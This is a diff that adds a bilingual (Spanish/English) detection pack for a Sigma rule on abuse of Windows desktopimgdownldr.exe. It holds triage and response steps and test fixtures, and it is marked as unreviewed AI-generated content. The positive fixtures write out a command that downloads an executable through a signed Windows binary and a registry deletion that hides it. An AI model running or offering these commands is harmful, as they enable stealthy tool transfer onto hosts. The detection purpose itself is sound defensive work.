@@ -1,0 +1,124 @@
+{
+  "rule": {
+    "id": "bb58aa4a-b80b-415a-a2c0-2f65a4c81009",
+    "title": "Suspicious Desktopimgdownldr Command",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó desktopimgdownldr.exe con /lockscreenurl: apuntando a un archivo que no es imagen, o se borró la clave de registro PersonalizationCSP. Ambos son patrones conocidos para descargar archivos con un binario nativo de Windows.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene ' /lockscreenurl:' sin las extensiones .jpg, .jpeg o .png, o que contiene a la vez 'reg delete' y '\\PersonalizationCSP'.",
+      "why_it_matters": "desktopimgdownldr.exe es un binario firmado por Microsoft que descarga la imagen de la pantalla de bloqueo. Un atacante puede usarlo para traer herramientas o payloads (T1105, Ingress Tool Transfer) y luego borrar PersonalizationCSP para ocultar el cambio de configuración.",
+      "triage_steps": [
+        "Revise el CommandLine completo: la URL después de /lockscreenurl:, el dominio, la extensión del archivo y si usa IP directa o HTTP sin cifrar.",
+        "Identifique ParentImage y la cadena de procesos padre; cmd.exe, powershell.exe, wscript.exe o macros de Office son más sospechosos que un agente de gestión.",
+        "Verifique el usuario y si el proceso corrió con privilegios elevados o con la variable SYSTEMROOT modificada.",
+        "Busque archivos nuevos en carpetas Personalization\\LockScreenImage y en el directorio de trabajo; obtenga el hash y revise su reputación.",
+        "En el mismo host, +/- 15 minutos: busque reg delete de PersonalizationCSP, ejecución del archivo descargado y conexiones salientes al dominio de la URL.",
+        "Busque la misma URL o dominio en proxy, DNS y otros endpoints, y revise alertas previas del host y del usuario."
+      ],
+      "false_positives": [
+        "Scripts o herramientas administrativas que configuran la pantalla de bloqueo corporativa con URL sin extensión de imagen, por ejemplo un endpoint dinámico interno.",
+        "Herramientas de gestión o scripts de limpieza que eliminan PersonalizationCSP al revertir una política de personalización."
+      ],
+      "response_steps": [
+        "Confirme con el equipo de TI si existe una política o script autorizado que explique la URL o el borrado del registro.",
+        "Si no se justifica, aísle el endpoint y bloquee el dominio o IP de la URL en proxy y firewall.",
+        "Recolecte el archivo descargado, su hash y la línea de tiempo del proceso antes de eliminar cualquier artefacto.",
+        "Elimine los payloads confirmados, busque persistencia asociada y restablezca la configuración de pantalla de bloqueo si fue alterada."
+      ],
+      "severity_rationale": "Nivel alto porque descargar archivos que no son imágenes o borrar PersonalizationCSP rara vez tiene uso legítimo y suele indicar transferencia de herramientas con un binario nativo."
+    },
+    "en": {
+      "summary": "desktopimgdownldr.exe ran with /lockscreenurl: pointing to a non-image file, or the PersonalizationCSP registry key was deleted. Both are known patterns for downloading files with a native Windows binary.",
+      "what_it_detects": "Process creation events whose CommandLine contains ' /lockscreenurl:' without .jpg, .jpeg or .png, or contains both 'reg delete' and '\\PersonalizationCSP'.",
+      "why_it_matters": "desktopimgdownldr.exe is a Microsoft-signed binary that fetches the lock screen image. Attackers can abuse it to pull tools or payloads (T1105, Ingress Tool Transfer), then delete PersonalizationCSP to hide the configuration change.",
+      "triage_steps": [
+        "Read the full CommandLine: the URL after /lockscreenurl:, its domain, file extension, and whether it uses a raw IP or plain HTTP.",
+        "Identify ParentImage and the parent chain; cmd.exe, powershell.exe, wscript.exe or Office macros are more suspicious than a management agent.",
+        "Check the user, whether the process ran elevated, and whether the SYSTEMROOT environment variable was altered.",
+        "Look for new files under Personalization\\LockScreenImage folders and the working directory; hash them and check reputation.",
+        "On the same host within +/- 15 minutes: look for reg delete of PersonalizationCSP, execution of the downloaded file and outbound connections to the URL's domain.",
+        "Search the same URL or domain in proxy, DNS and other endpoints, and review earlier alerts for the host and user."
+      ],
+      "false_positives": [
+        "Admin scripts or tools setting a corporate lock screen from a URL without an image extension, such as an internal dynamic endpoint.",
+        "Management tools or cleanup scripts removing PersonalizationCSP when reverting a personalization policy."
+      ],
+      "response_steps": [
+        "Confirm with IT whether an authorized policy or script explains the URL or the registry deletion.",
+        "If unexplained, isolate the endpoint and block the URL's domain or IP at the proxy and firewall.",
+        "Collect the downloaded file, its hash and the process timeline before removing any artifacts.",
+        "Remove confirmed payloads, hunt for related persistence and restore the lock screen configuration if it was changed."
+      ],
+      "severity_rationale": "High fits because downloading non-image files or deleting PersonalizationCSP rarely has a legitimate purpose and usually indicates tool transfer via a native binary."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "desktopimgdownldr downloading an executable via /lockscreenurl: (no image extension)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "CommandLine": "C:\\Windows\\System32\\desktopimgdownldr.exe /lockscreenurl:https://cdn.example.com/update/tool.exe /eventName:desktopimgdownldr",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c C:\\Windows\\System32\\desktopimgdownldr.exe /lockscreenurl:https://cdn.example.com/update/tool.exe /eventName:desktopimgdownldr"
+        }
+      },
+      {
+        "description": "Deletion of the PersonalizationCSP registry key to hide the lock screen change",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\reg.exe",
+          "CommandLine": "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP /f",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP /f"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate corporate lock screen image download (.jpg), excluded by the filter",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\desktopimgdownldr.exe",
+          "CommandLine": "C:\\Windows\\System32\\desktopimgdownldr.exe /lockscreenurl:https://intranet.example.com/branding/lockscreen.jpg /eventName:desktopimgdownldr",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+        }
+      },
+      {
+        "description": "reg query of PersonalizationCSP, not a deletion",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\reg.exe",
+          "CommandLine": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
